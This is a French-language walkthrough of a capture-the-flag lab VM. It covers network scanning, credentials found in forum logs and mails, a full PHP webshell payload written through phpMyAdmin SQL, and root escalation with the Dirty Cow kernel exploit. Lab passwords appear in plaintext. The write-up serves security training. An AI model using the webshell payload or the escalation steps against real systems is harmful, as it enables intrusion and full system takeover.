
## Configuration de la VM et ports

Après avoir créé simplement une VM, monté l'ISO du sujet, on peut configuer les options réseau de la VM sur virtualbox

Aller dans File->Host network manager

Créer un nouvel host, avec pour adresse 192.168.56.1

Aller dans Settings->Network

Dans adapteur1, créer un host-only, avec comme nom celui précédemment créé.

On lance la VM.

## Scan de la VM

On cherche l'adresse ip de notre VM. Dans la console :

- `nmap 192.168.56.0-255`
  ```shell
  [...]
    Nmap scan report for 192.168.56.101
    Host is up (0.10s latency).
    Not shown: 994 closed tcp ports (conn-refused)
    PORT    STATE SERVICE
    21/tcp  open  ftp
    22/tcp  open  ssh
    80/tcp  open  http
    143/tcp open  imap
    443/tcp open  https
    993/tcp open  imaps
  [...]
  ```

L'adresse qui nous intéresse ici est 192.168.56.101, car c'est celle qui possède le plus de ports d'ouverts.
On prendra toujours la dernière adresse qui possede le plus de ports ouverts, son numero peut changer selon les installations.
On l'appelera 192.168.56.#.

## Utiliser un 'penetration testing tools' pour trouver d'autres accès

On utilise **[Dirb](https://www.kali.org/tools/dirb/)**, qui cher he les pages web accessibles sur l'ip fournie.

- `./scripts/install_dirb`
- `dirb https://192.168.56.101 ~/Applications/dirb222/wordlists/common.txt -rN 403`
  ```shell
  [...]
    ---- Scanning URL: https://192.168.56.101/ ----
    ==> DIRECTORY: https://192.168.56.101/forum/
    ==> DIRECTORY: https://192.168.56.101/phpmyadmin/
    ==> DIRECTORY: https://192.168.56.101/webmail/
  [...]
  ```
On découvre ainsi l'existence d'un forum, d'un phpMyAdmin et d'un webmail.

## Forum

Parmi les sujets sur le forum, lmezard en a créé un nommé "Problème login ?" dont voici un extrait:

>Oct 5 08:45:26 BornToSecHackMe sshd[7547]: input_userauth_request: invalid user adam [preauth]<br/>
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): check pass; user unknown<br/>
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com<br/>
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: **Failed password for invalid user !q\]Ej?*5K5cy*AJ** from 161.202.39.38 port 57764 ssh2<br/>
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]<br/>
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)<br/>
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard<br/>
Oct 5 10:51:01 BornToSecHackMe CRON[13049]: pam_unix(cron:session): session closed for user root<br/>

L'utilisateur a entré ce qui ressemble à un password dans le champs login: `!q\]Ej?*5K5cy*AJ`

On essaie donc ce mot de passe pour l'utilisateur lmezard sur le forum via le lien 'Log in' en haut à droite de la page, ça fontionne !
Dans les paramètres du user, on trouve aussi son mail : `laurie@borntosec.net`

## Webmail

On peut accéder au webmail (https://192.168.56.#/webmail) avec l'adresse mail et le mot de passe du forum, ça fonctionne également !

On apprend dans les mails reçus que l'on peut accéder à la database avec les identifiants suivants, qui sont envoyés par ft_root@mail.borntosec.net :

`root` / `Fg-'kKXBj87E:aJ$`

## PhpMyAdmin Webshell exploit

On peut effectivement se connecter à phpMyAdmin (https://192.168.56.#/phpmyadmin) avec les identifiants découverts.
Après quelques recherches, cette version de phpMyAdmin est vulnérable à une [injection de code php dans le SQL](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/). Pour pouvoir exploiter cette vulnérabilité, il va falloir trouver un dossier où l'on peut écrire.

- `dirb https://192.168.56.101/forum ~/Applications/dirb222/wordlists/common.txt -rN 403`
  ```shell
  [...]
    ---- Scanning URL: https://192.168.56.101/forum/ ----
    ==> DIRECTORY: https://192.168.56.101/forum/images/
    ==> DIRECTORY: https://192.168.56.101/forum/includes/
    + https://192.168.56.101/forum/index (CODE:200|SIZE:4935)
    + https://192.168.56.101/forum/index.php (CODE:200|SIZE:4935)
    ==> DIRECTORY: https://192.168.56.101/forum/js/
    ==> DIRECTORY: https://192.168.56.101/forum/lang/
    ==> DIRECTORY: https://192.168.56.101/forum/modules/
    ==> DIRECTORY: https://192.168.56.101/forum/templates_c/
    ==> DIRECTORY: https://192.168.56.101/forum/themes/
    ==> DIRECTORY: https://192.168.56.101/forum/update/
  [...]
  ```

- On va tester ces dossiers pour notre exploit depuis l'onglet SQL de phpMyAdmin:
  ```sql
    SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if ($_GET["cmd"]) {system($_GET["cmd"]);} ?></pre>' into outfile '/var/www/forum/templates_c/f.php'
  ```
  - Le premier a fonctionner est le dossier forum/templates_c, on obtient donc un moyen de lancer des commandes via PhPMyAdmin à l'adresse "https://192.168.56.#/forum/templates_c/webshell.php" grâce à la fonction [system](https://www.php.net/manual/en/function.system.php) de php!

- `uname -a`
  > Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
  -  Ces infos sur le système nous seront utiles plus tard.
- `ls /home`
  > [...]LOOKATME[...]
- `ls /home/LOOKATME`
  > password
- `cat /home/LOOKATME/password`
  > lmezard:G!@M6f4Eatau{sF"

En fouinant un découvre que le contenu de "/home/LOOKATME/password" contient des identifiants pour une connexion ftp:
`lmezard` / `G!@M6f4Eatau{sF"`

## Connexion FTP et le fichier (pas) fun

- `brew install inetutils`
- `ftp`
  - `open`
  - `192.168.56.#`
  - `G!@M6f4Eatau{sF"`

  - `ls`
    ```shell
    [...]
      -rwxr-x---    1 1001     1001           96 Oct 15  2015 README
      -rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
    [...]
    ```
  - `get README`
  - `get fun`
  - `quit`

- `cat README`
  ```shell
    Complete this little challenge and use the result as password for user 'laurie' to login in ssh
  ```

- `file fun`
  ```shell
    fun: POSIX tar archive (GNU)
  ```

En faisant une première analyse manuelle de ce fichier, on voit clairement qu'il contient du code C, avec un main contenant 12 fonctions getmeX(), qui doivent renvoyer un caractère.

- `tar -xvf fun`
  -  On obtient un dossier ft_fun contenant de multiples fichiers aux noms barbares, contenant eux mêmes des morceaux de code C, avec un commentaire indiquant un numéro de fichier.

On doit donc écrire un script pour trier et former, dans l'ordre indiqué par les commentaires des fichiers, le code C de ces mêmes fichiers.
Ce script se trouve dans le dossier script du rendu.

- `python scripts/order.py`
- `gcc not_fun.c`
- ./a.out
  ```shell
    MY PASSWORD IS: Iheartpwnage
    Now SHA-256 it and submit
  ```

- `echo -n 'Iheartpwnage' | shasum -a 256`
  ```shell
    330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
  ```

## Connexion SSH & dirty cow

- `ssh laurie@192.168.56.#`
  - `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` 

Nous l'avions appris précédemment, le kernel est un Linux de version inférieure à 4.0

C'est pourquoi nous pouvons utiliser une vulnérabilité du système, au doux nom de [Dirty Cow](https://dirtycow.ninja/) (ref. CVE-2016-5195)

>  _A [race condition](https://en.wikipedia.org/wiki/Race_condition) was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.
An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system._

De nombreux codes existent sur internet afin de profiter de cette vulnérabilité, et nous avons choisi d'utiliser [ce code](https://www.exploit-db.com/exploits/40839), présent dans le dossier scripts, qui modifie le nom de connexion à root et change son password.

On ouvre donc un editeur de code (tel que vim) dans la VM, et on sauvegarde le code du dirty cow dans un fichier .c.

- `gcc -pthread dirty.c -lcrypt`.
- `./a.out passwd`
  ```shell
    /etc/passwd successfully backed up to /tmp/passwd.bak
    Please enter the new password: passwd
    Complete line:
    firefart:fijDIKjQYAYgU:0:0:pwned:/root:/bin/bash

    mmap: b7fda000

    ^C
  ```
- `su firefart`
  - `passwd`
- `id`
  ```shell
    uid=0(firefart) gid=0(root) groups=0(root)
  ```
